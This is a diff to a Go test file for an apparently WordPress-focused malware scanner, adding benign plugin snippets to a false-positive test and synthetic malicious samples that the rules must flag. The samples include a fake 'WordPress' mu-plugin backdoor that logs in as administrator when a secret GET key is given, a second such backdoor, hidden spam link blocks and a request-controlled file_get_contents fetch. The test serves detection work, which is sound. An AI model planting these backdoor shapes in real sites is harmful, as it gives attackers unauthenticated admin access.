@@ -241,12 +241,58 @@ func TestShippedRulesStayQuietOnLegitimateCode(t *testing.T) {
 		"<?php\n$chars = chr(0).chr(1).chr(2).chr(3).chr(4).chr(5).chr(6).chr(7).chr(8).chr(9);\n")
 	write(t, dir, "plugins/mojo-marketplace-wp-plugin/vendor/bluehost/endurance-wp-module-sso/functions.php",
 		"<?php\n$users = get_users( array( 'role' => 'administrator', 'number' => 1 ) );\nif ( isset( $users[0] ) ) { wp_set_auth_cookie( $users[0]->ID ); }\n")
+	write(t, dir, "mu-plugins/captaincore-helper.php",
+		"<?php\nif ( 'wp-login.php' !== $pagenow || empty( $_GET['user_id'] ) || empty( $_GET['captaincore_login_token'] ) ) { return; }\n$user = get_user_by( 'id', (int) $_GET['user_id'] );\nwp_set_auth_cookie( $user->ID );\n")
+	write(t, dir, "uploads/backupbuddy_temp/abc/importbuddy.php",
+		"<?php\n$fh = fopen( __FILE__, 'r' ); fseek( $fh, __COMPILER_HALT_OFFSET__ );\n")
+	write(t, dir, "plugins/really-simple-ssl/security/wordpress/two-fa/class-rsssl-two-factor.php",
+		"<?php\n$token = $_GET['rsssl_token'] ?? '';\nif ( hash_equals( $stored, $token ) ) { wp_set_auth_cookie( $user_id ); }\n")
+	write(t, dir, "plugins/akismet/akismet.php",
+		"<?php\n/**\n * Plugin Name: Akismet Anti-spam: Spam Protection\n * Author: Automattic - Anti-spam Team\n */\n")
+	write(t, dir, "plugins/some-theme-helper/style.php",
+		"<?php ?><a class=\"skip-link screen-reader-text\" href=\"#content\">Skip</a><style>.screen-reader-text{position:absolute;left:-9999px}</style>\n")
+	write(t, dir, "plugins/capability-manager-enhanced/includes/roles/class/class-pp-roles-actions.php",
+		"<?php\n$level = ($_REQUEST['current_role'] === 'administrator') ? 10 : absint($_REQUEST['role_level']);\n$role = get_role('administrator'); $user->set_role($_REQUEST['current_role']); wp_set_current_user($id);\n")
 	write(t, dir, "plugins/buddyboss-platform/bp-core/admin/classes/class-bb-support-access.php",
 		"<?php\n$id = wp_insert_user( array( 'user_login' => self::USER_LOGIN, 'user_email' => self::USER_EMAIL, 'role' => 'administrator' ) );\n")
 	res := s.ScanDir(dir)
 	for _, f := range res.Findings {
 		if SeverityRank(f.Severity) >= SeverityRank("high") {
 			t.Errorf("false positive at %s: %s on %s:%d %q", f.Severity, f.RuleID, f.File, f.Line, f.Match)
+		}
+	}
+}
+
+// Shapes written from the harvest corpus (synthetic stand-ins, not customer
+// files). Each must fire at high or critical.
+func TestShippedRulesCatchCorpusFamilies(t *testing.T) {
+	s := shippedRules(t)
+	dir := t.TempDir()
+	cases := map[string]struct{ content, rule string }{
+		"themes/x/vendor/lib/Header.php": {"<?php\nclass Header {}\n?><div style=\"position:absolute; left:-2083px; top:-2274px;\"><a href=\"http://example.invalid/dofa/pharmacy-express\">pharmacy express</a><a href=\"http://example.invalid/dofa/super-viagra-active\">super viagra active</a></div>\n", "hidden-pharma-links"},
+		"themes/x/footer.php":            {"<?php get_footer(); ?>\n<div style=\"position:absolute; left:-9999px;\"><a href=\"https://example.invalid/a\">one</a><a href=\"https://example.invalid/b\">two</a><a href=\"https://example.invalid/c\">three</a></div>\n", "offscreen-link-block"},
+		"mu-plugins/key.php":             {"<?php\n/**\n * Plugin Name: WordPress\n * Description: Auto-update request.\n * Version: 3.3\n * Author: WordPress\n */\ndefined('ABSPATH') || exit;\ndefine('WPK_SECRET_KEY', 'devupdate');\nadd_action('init', function () {\n    if (!isset($_GET['dev']) || $_GET['dev'] !== WPK_SECRET_KEY) { return; }\n    global $wpdb;\n    $admin_id = $wpdb->get_var(\"SELECT u.ID FROM {$wpdb->users} u INNER JOIN {$wpdb->usermeta} m ON u.ID = m.user_id WHERE m.meta_key = '{$wpdb->prefix}capabilities' AND m.meta_value LIKE '%administrator%' LIMIT 1\");\n    wp_set_auth_cookie($admin_id, true);\n});\n", "fake-wordpress-plugin-header"},
+		"mu-plugins/key2.php":            {"<?php\ndefine('WPK_SECRET_KEY', 'devupdate');\nif ($_GET['dev'] !== WPK_SECRET_KEY) { exit; }\n$users = get_users(array('role' => 'administrator'));\nwp_set_auth_cookie($users[0]->ID);\n", "secret-key-admin-access"},
+		"themes/x/pages/load.php":        {"<?php echo file_get_contents($_GET['url']); ?>\n", "request-controlled-fetch"},
+		"themes/x/js.php":                {"<?php print(\"upload::http://nothing\");", "get-nothing-marker"},
+	}
+	for rel, c := range cases {
+		write(t, dir, rel, c.content)
+	}
+	res := s.ScanDir(dir)
+	by := map[string][]Finding{}
+	for _, f := range res.Findings {
+		by[f.File] = append(by[f.File], f)
+	}
+	for rel, c := range cases {
+		found := false
+		for _, f := range by[rel] {
+			if f.RuleID == c.rule && SeverityRank(f.Severity) >= SeverityRank("high") {
+				found = true
+			}
+		}
+		if !found {
+			t.Errorf("%s: expected %s at high+, got %v", rel, c.rule, ids(by[rel]))
 		}
 	}
 }
